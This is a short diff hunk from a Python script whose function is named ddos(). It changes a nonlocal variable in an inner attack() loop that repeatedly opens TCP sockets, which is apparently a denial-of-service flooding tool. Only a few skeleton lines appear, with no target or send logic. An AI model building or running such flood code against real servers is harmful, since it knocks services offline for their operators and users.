@@ -41,7 +41,7 @@ def ddos():
     time.sleep(2)
 
     def attack():
-        nonlocal attack_num
+        nonlocal attack_ip
         while True:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
